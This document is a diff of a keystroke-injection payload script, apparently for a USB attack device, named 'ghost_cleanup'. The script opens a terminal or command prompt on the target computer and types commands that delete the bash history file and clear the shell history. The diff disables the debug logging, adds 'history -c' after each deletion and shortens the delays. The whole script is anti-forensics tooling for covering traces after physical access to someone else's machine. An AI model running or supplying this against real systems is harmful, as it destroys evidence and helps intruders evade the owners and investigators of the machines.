@@ -8,27 +8,23 @@
 #
 # Cleans the input history on Windows, Mac and Linux
 #
+LED G
 
 #+++ CONFIG +++
-
-DEBUG=true
 
 # EXACT NUMBER OF LINES TO REMOVE FROM HISTORY (MAC / LINUX) - DEFAULT : 0 = ALL
 LINES=0
 
 #+++ END CONFIG +++
 
-
-DEBUG_FILE="/dev/null"
-if [ "$DEBUG" ]; then
-    DEBUG_FILE="/root/udisk/loot/ghost_cleanup/debug.txt"
-    if [ ! -d "/root/udisk/loot/ghost_cleanup" ]; then
-      mkdir /root/udisk/loot
-      mkdir /root/udisk/loot/ghost_cleanup
-    fi
-    touch "${DEBUG_FILE}"
-fi
-echo "Hold on to your butts" > "${DEBUG_FILE}"
+#if [ $DEBUG==true ]; then
+#    DEBUG_FILE="/root/udisk/loot/ghost_cleanup/debug.txt"
+#    if [ ! -d "/root/udisk/loot/ghost_cleanup" ]; then
+#      mkdir /root/udisk/loot
+#      mkdir /root/udisk/loot/ghost_cleanup
+#    fi
+#    touch "${DEBUG_FILE}"
+#fi
 
 # PLATFORM CHECK
 # LOOTFILE CHECK - DEFAULT PLATFORM: MAC / LINUX.
@@ -36,11 +32,9 @@ echo "Hold on to your butts" > "${DEBUG_FILE}"
 
 if [ -f "/root/udisk/loot/ghost_cleanup/win_switch" ]; then
     LED B
-    echo "WINDOWS" > "${DEBUG_FILE}"
     PLATFORM_COMMAND="cmd"
 else
     LED O
-    echo "MAC / LINUX" > "${DEBUG_FILE}"
     PLATFORM_COMMAND="terminal"
 fi
 
@@ -56,19 +50,24 @@ QUACK GUI r
 QUACK BACKSPACE
 QUACK DELAY 100
 QUACK STRING "${PLATFORM_COMMAND}"
+QUACK DELAY 200
 QUACK ENTER
-QUACK DELAY 10000
+QUACK DELAY 1000
 
 # PLATFORM COMMANDS
-if [ $PLATFORM_COMMAND=="terminal" ]; then
+if [ "$PLATFORM_COMMAND"=="terminal" ]; then
 # MAC / LINUX
     #++ INSERT CUSTOM MAC / LINUX CLEANUP GOODNESS ++
 
-    if [ $LINES > 0 ]; then
-        QUACK STRING head -n -$LINES ~/.bash_history
+    if [ "$LINES" -gt "0" ]; then
+        QUACK STRING head -n -$LINES "~/.bash_history"
+        QUACK ENTER
+        QUACK STRING history -c
         QUACK ENTER
     else
-        QUACK STRING rm ~/.bash_history
+        QUACK STRING rm "~/.bash_history"
+        QUACK ENTER
+        QUACK STRING history -c
         QUACK ENTER
     fi
 else
